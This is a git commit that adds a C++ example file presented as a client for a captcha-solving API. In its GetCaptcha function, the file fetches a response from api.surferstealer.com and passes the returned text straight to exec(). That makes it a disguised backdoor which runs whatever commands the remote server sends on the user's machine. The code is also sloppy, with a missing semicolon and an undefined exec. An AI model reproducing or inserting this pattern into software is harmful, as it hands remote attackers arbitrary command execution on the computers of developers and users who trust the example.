e1151a96e4a49916e0eb69269d7ddcd6bf029be0
HeySurfer <58826689+heysurfer@users.noreply.github.com>
2022-05-18 22:07:59 +0300

    Add files via upload

---
+++ Example_CPP/cpp_example.cpp
@@ -0,0 +1,20 @@
+#include "HTTPRequest.hpp"
+
+std::string GetCaptcha(std::string captchaid)
+{
+    http::Request request{"http://api.surferstealer.com/captcha/index?CaptchaID"+captchaid};
+    const auto response = request.send("GET");
+
+  std::string cmd= std::string{response.body.begin(), response.body.end()}
+  std::string captchaAnswer = exec(cmd.c_str());
+
+  if (captchaAnswer.find("Failed") != std::string::npos) 
+      std::cout << "Captcha Failed.!" << '\n';
+  else if (captchaAnswer.find("Answer|") != std::string::npos) 
+  {
+        std::cout << "Captcha Success.!" << '\n';
+        std::cout << captchaAnswer<< '\n';
+        return captchaAnswer;
+  }
+    return "Fail";
+}
